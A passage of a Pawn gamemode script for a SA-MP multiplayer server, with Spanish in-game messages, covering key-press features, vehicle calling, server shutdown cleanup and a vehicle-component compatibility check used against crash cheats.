									if(PI[playerid][P_DERBY_SPECTATEPLAYER] != i)
									{
										PlayerSpectateVehicle(playerid, PI[i][P_DERBY_VEHICLEID]);
										PI[playerid][P_DERBY_SPECTATEPLAYER] = i;
										new str[70]; format(str, 70, "_~n~_~n~_~n~_~n~~y~-_~g~~h~%s_~b~~h~%d_~y~-~n~_", PI[ PI[playerid][P_DERBY_SPECTATEPLAYER] ][P_NAME], PI[playerid][P_DERBY_SPECTATEPLAYER]);
										GameTextForPlayer(playerid, str, 3000, 3);
										return 1;
									}
								}
							}
						}
					}
				}
				return 1;
			}
		}
	}
    //if(newkeys & KEY_CROUCH)
    //AntiRapidFire[playerid] = 0;
	if(ArmasProhibidas[playerid] == 1)
    {
    	if(newkeys & KEY_FIRE && ArmaProhibida(playerid))
    	{
    		new Arma, Balas;
    		GetPlayerWeaponData(playerid, 7, Arma, Balas);
    		ResetPlayerWeapons(playerid);
    		SetPlayerHealth(playerid, 0);
    		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser vip {00BFFF}Nivel 3{EAEAEA} o estar en el guerra deathmatch para usar esta arma.");
    	}
    }
	if(MegaJump[playerid] == 1)
    {
        if(PRESSED(KEY_JUMP))
        {
            new Float:P[3];
            GetPlayerPos(playerid,P[0],P[1],P[2]);
            GetPlayerVelocity(playerid,P[0],P[1],P[2]);
            SetPlayerVelocity(playerid,P[0],P[1],P[2]+5.0);
        }
    }
    if(Enabled[playerid] == 1)
    {
	if (IsPlayerInAnyVehicle(playerid))
	{
		if((newkeys & KEY_ACTION) && !(oldkeys & KEY_ANALOG_UP))
		{
	        switch(GetVehicleModel( GetPlayerVehicleID(playerid) )) {
			case 592,577,511,512,593,520,553,476,519,460,513,487,488,548,425,417,497,563,447,469:
			return 1;
			}
		    if(CreatedRamp[playerid] == true) DestroyObject(Ramp[playerid]), CreatedRamp[playerid] = false;
			new Float:pX,Float:pY,Float:pZ,Float:vA, Arabam = GetPlayerVehicleID(playerid);
			GetVehiclePos(Arabam, pX, pY, pZ);
			GetVehicleZAngle(Arabam, vA);
			Ramp[playerid] = CreateObject(Pers[playerid], pX + (20.0 * floatsin(-vA, degrees)), pY + (20.0 * floatcos(-vA, degrees)), pZ, 0, 0, vA);
			CreatedRamp[playerid] = true;
			SetTimerEx("destroy", 4000,0,"d",playerid);
		}
	  }
	}
	if (Joined[playerid]==true)
	{
		if(newkeys == KEY_YES)
		{
			if(PosCP_X!=0 && PosCP_Y!=0 && PosCP_Z!=0)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				SetVehiclePos(vehicleid, PosCP_X, PosCP_Y, PosCP_Z);
			}
		}
	}
   	if (newkeys == KEY_SUBMISSION)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
			return 1;
		}
		if(IsPlayerInVehicle(playerid, vehicleid))
		{
		    if(Joined[playerid] == false)return SendClientMessage(playerid, red, "|Error|»{EAEAEA} Esta tecla solo se puede utilizar en una carrera.");
			RepairVehicle(GetPlayerVehicleID(playerid));
			SetVehicleHealth(vehicleid,1000000.0);
			new Float:PX, Float:PY, Float:PZ, Float:PA;
			GetPlayerPos(playerid, PX, PY, PZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid), PA);
			SetVehiclePos(GetPlayerVehicleID(playerid), PX, PY, PZ+1);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), PA);
			PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		}
	}
	#if defined ENABLE_SPEC
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
		if(newkeys == KEY_JUMP) AdvanceSpectate(playerid);
		else if(newkeys == KEY_SPRINT) ReverseSpectate(playerid);
	}
	#endif
	if(newkeys == KEY_SECONDARY_ATTACK ){
		if(!IsPlayerInAnyVehicle(playerid)){
			new Float:x, Float:y, Float:z, vehicle;
			GetPlayerPos(playerid, x, y, z );
			GetVehicleWithinDistance(playerid, x, y, z, 20.0, vehicle);
			if(IsVehicleRcTram(vehicle)){
			    PutPlayerInVehicle(playerid, vehicle, 0);
			    intram[playerid] = 1;
				tramid[playerid] = GetPlayerVehicleID(playerid);
			}
		}
		else {
			new vehicleID = GetPlayerVehicleID(playerid);
			if(IsVehicleRcTram(vehicleID) || GetVehicleModel(vehicleID) == RC_CAM){
			    if(GetVehicleModel(vehicleID) != D_TRAM){
			    	new Float:x, Float:y, Float:z;
			   	 	GetPlayerPos(playerid, x, y, z);
		    		SetPlayerPos(playerid, x+0.5, y, z+1.0);
				}
			}
		}
	}
	if(newkeys & KEY_ACTION)
	{
        if(BloquearComandosInDM[playerid] == 0)
        if(Joined[playerid] == false)
        if(AceleracionBrutal[playerid] == true) // Si ha activado la Aceleracion Brutal
		if(PlayerInfo[playerid][Vip] >=1) {
			if (IsPlayerInAnyVehicle(playerid))
			{
				if((GetPlayerVehicleID(playerid) == 520) || (GetPlayerVehicleID(playerid) == 425) || (GetPlayerVehicleID(playerid) == 464)) {
					return 1;
				}
				else {
					new Float:vx, Float:vy, Float:vz;
					GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~r~TURBO!", 3000, 5);
					GetVehicleVelocity(GetPlayerVehicleID(playerid), vx, vy, vz);
					SetVehicleVelocity(GetPlayerVehicleID(playerid) ,vx*2,vy*2 ,vz*2);
				}
			}
		}
	}
	if(newkeys & KEY_CROUCH)
	{
        if(BloquearComandosInDM[playerid] == 0)
        if(Joined[playerid] == false)
		if(SaltosVehiculo[playerid] == true) //Si ha activado el supersalto con vehiculo.
		if(PlayerInfo[playerid][Vip] >=1) {
			if (IsPlayerInAnyVehicle(playerid))
			{
				if((GetPlayerVehicleID(playerid) == 520) || (GetPlayerVehicleID(playerid) == 425) || (GetPlayerVehicleID(playerid) == 464)) {
					return 1;
				}
				else {
					new Float:jx, Float:jy, Float:jz;
					GetVehicleVelocity(GetPlayerVehicleID(playerid),jx,jy,jz);
                    SetVehicleVelocity(GetPlayerVehicleID(playerid),jx,jy,jz+0.3);
				}
			}
		}
    }
	if(newkeys & KEY_FIRE)
	{
        if(Joined[playerid] == false)
	    if(PlayerInfo[playerid][Vip] >=1) {
			if (GetPlayerVehicleID(playerid))
			{
				AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
		}
	}
	}
	return 1;
}

GetVehicleWithinDistance( playerid, Float:x3, Float:y3, Float:z3, Float:dist, &veh){
	for(new i = 1; i < MAX_VEHICLES; i++){
		if(GetVehicleModel(i) > 0){
			if(GetPlayerVehicleID(playerid) != i ){
	        	new Float:x, Float:y, Float:z;
	        	new Float:x4, Float:y4, Float:z4;
				GetVehiclePos(i, x, y, z);
				x4 = x3 - x; y4 = y3 - y; z4 = z3 - z;
				new Float:vDist = (x4*x4+y4*y4+z4*z4);
				if( vDist < dist){
					veh = i;
					dist = vDist;
				}
			}
		}
	}
}

IsVehicleRcTram( vehicleid ){
   	switch(GetVehicleModel(vehicleid)){
		case D_TRAM, RC_GOBLIN, RC_BARON, RC_BANDIT, RC_RAIDER, RC_TANK: return 1;
		default: return 0;
	}
	return 0;
}
//==============================Gamemode exit stuff=============================
public OnGameModeExit()
{
    BuildCreatedVehicle = (BuildCreatedVehicle == 0x01) ? (DestroyVehicle(BuildVehicle), BuildCreatedVehicle = 0x00) : (DestroyVehicle(BuildVehicle), BuildCreatedVehicle = 0x00);
	KillTimer(rCounter);
	KillTimer(CountTimer);
	Loop(i, MAX_PLAYERS)
	{
		DisablePlayerRaceCheckpoint(i);
		//TextDrawDestroy(RaceInfo[i]);
		DestroyVehicle(CreatedRaceVeh[i]);
		Joined[i] = false;
		SetPVarInt(i, "JoinedToRRAce", false);
		KillTimer(InfoTimer[i]);
	}
	JoinCount = 0;
	FinishCount = 0;
	TimeProgress = 0;
	AutomaticRace = false;
    KillTimer(MSecondsTimer);
    new i = 0;
	while(i < MAX_PLAYERS)
	{
	CreatedRamp[i] = false;
	DestroyObject(Ramp[i]);
	i++;
	}
//-----------------------------------Houses-------------------------------------
	DestroyAllDynamicPickups();
	DestroyAllDynamicMapIcons();
	DestroyAllDynamic3DTextLabels();
//-----------------------------------LAdmin-------------------------------------
	KillTimer(PingTimer);
	KillTimer(GodTimer);
	new year,month,day;	getdate(year, month, day);
	new hour,minute,second; gettime(hour,minute,second);
	print("\n________________________________________");
	print("________________________________________");
	print("           LAdmin Unloaded              ");
	print("________________________________________");
	printf("     Date: %d/%d/%d  Time: %d:%d :%d   ",day,month,year, hour, minute, second);
	print("________________________________________");
	print("________________________________________\n");
//-----------------------------Unload Race Scrpt--------------------------------
	print("\n+--------------------------+");
	print("| Yagu's Race script v0.4a |");
	print("+---------UNLOADED---------+\n");
	#if defined MENUSYSTEM
	DestroyMenu(MAdmin);
	DestroyMenu(MPMode);
	DestroyMenu(MPrize);
	DestroyMenu(MDyna);
	DestroyMenu(MBuild);
	DestroyMenu(MLaps);
	DestroyMenu(MRace);
	DestroyMenu(MRacemode);
	DestroyMenu(MFee);
	DestroyMenu(MCPsize);
	DestroyMenu(MDelay);
	#endif

	BackupInfo();
	return 1;
}
//=================================Backup Info==================================
public BackupInfo()
{
	SaveBusinesses();
	SaveVehicles();
	for(new i=0;i<GetMaxPlayers();i++) {
		if(PlayerInfo[i][LoggedIn] == 1) {
			SavePlayer(i);
		}
	}
}
//===============================Vehicle Stocks=================================
public CallVehicleToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle2ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned2];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle3ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned3];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle4ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned4];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}

public CallVehicle5ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned5];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle6ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned6];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle7ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned7];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle8ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned8];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle9ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned9];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}
public CallVehicle10ToPlayer(playerid)
{
	new vehicleid = PlayerInfo[playerid][vowned10];
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid,x,y,z);
	GetPlayerFacingAngle(playerid, a);
	x += (3 * floatsin(-a, degrees));
	y += (3 * floatcos(-a, degrees));
	DestroyVehicle(vehicleid);
	onsys[vehicleid] = 1;
	CreateVehicle(VehicleInfo[vehicleid][model],x,y,z-0.35,a+90,VehicleInfo[vehicleid][color_1],VehicleInfo[vehicleid][color_2],1000);
	ModVehicle(vehicleid);
	format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Tu {5783C2}%s{EAEAEA} ha sido transportado con éxito a tu ubicacion!",VehicleInfo[vehicleid][name]);
	SendClientMessage(playerid, red, carmess);
}

public OnVehicleMod(playerid, vehicleid,componentid)
{
	if(onsys[vehicleid] == 1) {
	SaveComponent(vehicleid,componentid);
	}
    if((IsPlayerInRangeOfPoint(playerid,2,617.5303,-1.9900,1000.651) && GetPlayerInterior(playerid) == 1) ||
    (IsPlayerInRangeOfPoint(playerid,2,616.7830,-74.8150,997.772) && GetPlayerInterior(playerid) == 2) ||
    (IsPlayerInRangeOfPoint(playerid,2,615.2862,-124.2390,997.697) && GetPlayerInterior(playerid) == 3)) return 1;
	switch(componentid)
	{
	    case 1008..1010: if(IsPlayerInInvalidNosVehicle(playerid)) RemoveVehicleComponent(vehicleid, componentid);
	}
	if(!IsComponentidCompatible(GetVehicleModel(vehicleid), componentid)) RemoveVehicleComponent(vehicleid, componentid);
	new UsandoCrasher[128];
	format(UsandoCrasher,sizeof(UsandoCrasher),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Posible Car Crasher)",PlayerName2(playerid),playerid);
    SendClientMessageToAll(red, UsandoCrasher);
    SaveToFile("KickLog",UsandoCrasher);
    Kick(playerid);
	return 1;
}

stock IsPlayerInInvalidNosVehicle(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);
	#define MAX_INVALID_NOS_VEHICLES 52
	new InvalidNosVehicles[MAX_INVALID_NOS_VEHICLES] =
	{
		581,523,462,521,463,522,461,448,468,586,417,425,469,487,512,520,563,593,
		509,481,510,472,473,493,520,595,484,430,453,432,476,497,513,533,577,
		452,446,447,454,590,569,537,538,570,449,519,460,488,511,519,548,592
	};
 	if(IsPlayerInAnyVehicle(playerid))
  	{
   		for(new i = 0; i < MAX_INVALID_NOS_VEHICLES; i++)
     	{
      		if(GetVehicleModel(vehicleid) == InvalidNosVehicles[i]) return true;
       	}
   	}
   	return false;
}

stock IsComponentidCompatible(modelid, componentid)
{
    if(componentid == 1025 || componentid == 1073 || componentid == 1074 || componentid == 1075 || componentid == 1076 ||
         componentid == 1077 || componentid == 1078 || componentid == 1079 || componentid == 1080 || componentid == 1081 ||
         componentid == 1082 || componentid == 1083 || componentid == 1084 || componentid == 1085 || componentid == 1096 ||
         componentid == 1097 || componentid == 1098 || componentid == 1087 || componentid == 1086)
         return true;

    switch (modelid)
    {
        case 400: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 401: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 114 || componentid == 1020 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 402: return (componentid == 1009 || componentid == 1009 || componentid == 1010);
        case 404: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 405: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1023 || componentid == 1000);
        case 409: return (componentid == 1009);
        case 410: return (componentid == 1019 || componentid == 1021 || componentid == 1020 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 411: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 412: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 415: return (componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 418: return (componentid == 1020 || componentid == 1021 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016);
        case 419: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 420: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1003);
        case 421: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1016 || componentid == 1000);
        case 422: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007);
        case 426: return (componentid == 1005 || componentid == 1004 || componentid == 1021 || componentid == 1019 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003);
        case 429: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 436: return (componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1019 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 438: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 439: return (componentid == 1003 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1017 || componentid == 1007 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1013);
        case 442: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 445: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 451: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 458: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 466: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 467: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 474: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 475: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 477: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1017 || componentid == 1007);
        case 478: return (componentid == 1005 || componentid == 1004 || componentid == 1012 || componentid == 1020 || componentid == 1021 || componentid == 1022 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 479: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 480: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 489: return (componentid == 1005 || componentid == 1004 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1016 || componentid == 1000);
        case 491: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 492: return (componentid == 1005 || componentid == 1004 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1016 || componentid == 1000);
        case 496: return (componentid == 1006 || componentid == 1017 || componentid == 1007 || componentid == 1011 || componentid == 1019 || componentid == 1023 || componentid == 1001 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1003 || componentid == 1002 || componentid == 1142 || componentid == 1143 || componentid == 1020);
        case 500: return (componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1013 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 506: return (componentid == 1009);
        case 507: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 516: return (componentid == 1004 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1015 || componentid == 1016 || componentid == 1000 || componentid == 1017 || componentid == 1007);
        case 517: return (componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 518: return (componentid == 1005 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1018 || componentid == 1013 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 526: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 527: return (componentid == 1021 || componentid == 1020 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1014 || componentid == 1015 || componentid == 1017 || componentid == 1007);
        case 529: return (componentid == 1012 || componentid == 1011 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 533: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 534: return (componentid == 1126 || componentid == 1127 || componentid == 1179 || componentid == 1185 || componentid == 1100 || componentid == 1123 || componentid == 1125 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1180 || componentid == 1178 || componentid == 1101 || componentid == 1122 || componentid == 1124 || componentid == 1106);
        case 535: return (componentid == 1109 || componentid == 1110 || componentid == 1113 || componentid == 1114 || componentid == 1115 || componentid == 1116 || componentid == 1117 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1120 || componentid == 1118 || componentid == 1121 || componentid == 1119);
        case 536: return (componentid == 1104 || componentid == 1105 || componentid == 1182 || componentid == 1181 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1184 || componentid == 1183 || componentid == 1128 || componentid == 1103 || componentid == 1107 || componentid == 1108);
        case 540: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 541: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 542: return (componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1014 || componentid == 1015);
        case 545: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
        case 546: return (componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1019 || componentid == 1018 || componentid == 1024 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1001 || componentid == 1023 || componentid == 1017 || componentid == 1007);
        case 547: return (componentid == 1142 || componentid == 1143 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1016 || componentid == 1003 || componentid == 1000);
        case 549: return (componentid == 1012 || componentid == 1011 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1001 || componentid == 1023 || componentid == 1003 || componentid == 1017 || componentid == 1007);
        case 550: return (componentid == 1005 || componentid == 1004 || componentid == 1142 || componentid == 1143 || componentid == 1144 || componentid == 1145 || componentid == 1020 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1001 || componentid == 1023 || componentid == 1003);
        case 551: return (componentid == 1005 || componentid == 1020 || componentid == 1021 || componentid == 1019 || componentid == 1018 || componentid == 1008 || componentid == 1009 || componentid == 1010 || componentid == 1006 || componentid == 1002 || componentid == 1023 || componentid == 1016 || componentid == 1003);
        case 555: return (componentid == 1008 || componentid == 1009 || componentid == 1010);
